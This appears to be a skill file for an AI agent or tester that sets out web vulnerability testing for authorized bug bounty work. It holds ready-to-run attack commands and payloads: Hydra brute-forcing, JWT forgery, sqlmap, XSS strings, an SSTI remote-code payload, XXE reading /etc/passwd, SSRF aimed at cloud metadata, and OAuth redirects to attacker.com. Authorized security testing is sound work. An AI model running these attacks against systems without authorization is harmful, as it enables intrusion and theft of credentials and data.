# SKILL: Web Vulnerability Testing
**Systematic, evidence-based testing. Confirm before reporting.**

---

## TESTING PRIORITY ORDER
1. Auth & Access Control (highest ROI, highest severity)
2. Injection (SQLi, XSS, SSTI, XXE)
3. Business Logic (program-specific, hardest to automate)
4. Configuration Issues (cloud, headers, CORS)
5. Information Disclosure

---

## 1. AUTHENTICATION ATTACKS

### 1.1 Login Flow Analysis
```bash
# Map all auth endpoints first
grep -iE "login|signin|auth|oauth|sso|token|password" sessions/{DATE}/crawl-{TARGET}.txt

# Check for:
# - Username enumeration (different error messages for valid/invalid users)
# - Account lockout (or lack thereof)
# - Password policy enforcement
# - Multi-factor bypass
```

### 1.2 Default Credentials
```bash
# Try common defaults on any login panel found in recon
# admin:admin, admin:password, admin:123456, root:root
# Use Hydra only after confirming no lockout exists and explicit scope authorization
hydra -L wordlists/usernames-small.txt -P wordlists/passwords-common.txt \
  {TARGET} http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 4 -w 30  # low thread count to avoid lockout
```

### 1.3 JWT Testing
```bash
# Capture JWT from login response
# Decode and analyze
jwt-tool {JWT_TOKEN} -t

# Test algorithm confusion (alg:none)
jwt-tool {JWT_TOKEN} -X a

# Test RS256 to HS256 confusion
jwt-tool {JWT_TOKEN} -X s -pk pubkey.pem

# Test key injection
jwt-tool {JWT_TOKEN} -X i

# Crack weak secret
jwt-tool {JWT_TOKEN} -C -d wordlists/jwt-secrets.txt
```

### 1.4 OAuth Misconfigurations
```bash
# Check redirect_uri validation
# Test: redirect_uri=https://attacker.com
# Test: redirect_uri=https://victim.com.attacker.com
# Test: redirect_uri=https://victim.com@attacker.com
# Test: redirect_uri=https://victim.com/../../attacker

# Check state parameter (CSRF)
# Remove state parameter entirely — does auth still complete?

# Check for authorization code reuse
# Use auth code twice — should fail second time

# Check for open redirect in post-auth redirect
```

---

## 2. ACCESS CONTROL / IDOR

### 2.1 Horizontal IDOR
```bash
# Methodology: Create two accounts (A and B), then:
# 1. As user A, perform action and capture request
# 2. Change the user/resource identifier to user B's resource
# 3. Does the response succeed? IDOR confirmed.

# Common IDOR parameters to test:
# user_id, account_id, order_id, invoice_id, document_id
# uid, id, oid, pid, tid, rid

# Test parameter locations: URL path, query string, POST body, headers, cookies
```

### 2.2 Vertical Privilege Escalation
```bash
# Test admin/privileged endpoints as regular user
# Look for: /admin/*, /api/admin/*, /internal/*, /manage/*

# Test role parameter manipulation
# If JWT contains "role": "user", try "role": "admin"
# If cookie contains "isAdmin=false", try "isAdmin=true"

# Test UUID vs sequential ID — sequential IDs are always worth probing
```

### 2.3 Mass Assignment
```bash
# Add unexpected fields to POST/PUT requests
# Common targets: role, is_admin, verified, plan, credits, balance

# Example: POST /api/users/profile
# Normal: {"name": "Alice", "email": "alice@example.com"}
# Attack: {"name": "Alice", "email": "alice@example.com", "role": "admin", "credits": 99999}
```

---

## 3. INJECTION

### 3.1 SQL Injection
```bash
# First: find injection points from parameter discovery
# Quick manual test: ' OR '1'='1  /  " OR "1"="1  /  1' --

# Automated with sqlmap (confirm no destructive flags)
sqlmap -u "https://{TARGET}/api/endpoint?id=1" \
  --cookie="session={SESSION}" \
  --level=3 --risk=2 \
  --batch \
  --technique=BEUSTQ \
  --dbms=mysql \
  -o sessions/{DATE}/sqlmap-{TARGET}.txt

# For POST parameters:
sqlmap -u "https://{TARGET}/api/endpoint" \
  --data="email=test@test.com&password=test" \
  --level=3 --risk=2 --batch

# NOTE: --dump requires explicit operator confirmation. Do NOT add by default.
```

### 3.2 XSS Testing
```bash
# Dalfox for automated XSS discovery
dalfox url "https://{TARGET}/search?q=test" \
  --cookie "session={SESSION}" \
  --silence \
  -o sessions/{DATE}/xss-{TARGET}.txt

# Pipe URL list
cat sessions/{DATE}/params-{TARGET}.txt | dalfox pipe \
  --cookie "session={SESSION}" \
  -o sessions/{DATE}/xss-bulk-{TARGET}.txt

# Manual payload list for reflection testing:
# <script>alert(1)</script>
# "><script>alert(1)</script>
# '><img src=x onerror=alert(1)>
# javascript:alert(1)
# {{7*7}}  (also tests SSTI)
```

### 3.3 SSTI (Server-Side Template Injection)
```bash
# Detection payloads — send in any user-input that gets reflected
# {{7*7}} → 49 (Jinja2/Twig)
# ${7*7} → 49 (FreeMarker/Velocity)  
# #{7*7} → 49 (Pebble)
# <%= 7*7 %> → 49 (ERB)
# *{7*7} → 49 (Spring/Thymeleaf)

# If math works, escalate:
# Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# Twig: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### 3.4 XXE (XML External Entity)
```bash
# Look for XML input: SOAP endpoints, file uploads (docx/xlsx/svg), content-type: application/xml

# Basic XXE probe:
# <?xml version="1.0"?>
# <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <root>&xxe;</root>

# Blind XXE via OOB:
# <!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://your-collaborator.com/xxe">%xxe;]>
```

### 3.5 SSRF
```bash
# Find SSRF entry points: URL parameters, webhook URLs, PDF generators, import/fetch features
# grep -iE "url=|fetch=|redirect=|link=|src=|href=|path=|dest=" params-{TARGET}.txt

# Basic probe payloads:
# http://127.0.0.1
# http://localhost
# http://169.254.169.254/latest/meta-data/  (AWS metadata)
# http://metadata.google.internal/        (GCP metadata)
# http://169.254.169.254/metadata/v1/     (Azure)

# Use Burp Collaborator or interactsh for blind SSRF
# python3 -m interactsh-client -v
```

---

## 4. BUSINESS LOGIC

### 4.1 Race Conditions
```bash
# Targets: coupon codes, referral bonuses, transfer limits, vote/like mechanisms
# Use Turbo Intruder (Burp) or parallel curl requests

# Bash parallel test:
for i in {1..20}; do
  curl -s -X POST "https://{TARGET}/api/redeem-coupon" \
    -H "Authorization: Bearer {TOKEN}" \
    -d '{"code":"FREEMONEY10"}' &
done
wait
```

### 4.2 Price/Value Manipulation
```bash
# Test: negative quantities, zero prices, integer overflow
# POST /checkout with qty=-1, price=0.001, amount=-100

# Test parameter pollution:
# ?amount=100&amount=-100 (which one does the server use?)
```

### 4.3 Account Takeover via Password Reset
```bash
# Test reset token expiry (still valid after 24h?)
# Test reset token reuse (can same token be used twice?)
# Test host header injection in reset email link
# Test username case manipulation: ADMIN vs admin vs Admin
# Test Unicode normalization bypasses
```

---

## 5. NUCLEI SCANNING

```bash
# Run full nuclei template suite against live targets
nuclei -l sessions/{DATE}/live-{TARGET}.txt \
  -t ~/nuclei-templates/ \
  -severity medium,high,critical \
  -exclude-tags intrusive,dos \
  -rate-limit 50 \
  -o sessions/{DATE}/nuclei-{TARGET}.txt \
  -stats

# Target specific vulnerability classes
nuclei -l sessions/{DATE}/live-{TARGET}.txt \
  -tags cve,exposed-panels,misconfig,default-login \
  -o sessions/{DATE}/nuclei-priority-{TARGET}.txt
```

---

## FINDING CONFIDENCE LEVELS

Before writing a report, classify each finding:
- `CONFIRMED` — Reproduced multiple times, no doubt
- `LIKELY` — Strong indicators but needs one more validation
- `POTENTIAL` — Needs deeper investigation
- `FALSE POSITIVE` — Investigated and ruled out

Only report `CONFIRMED` findings.
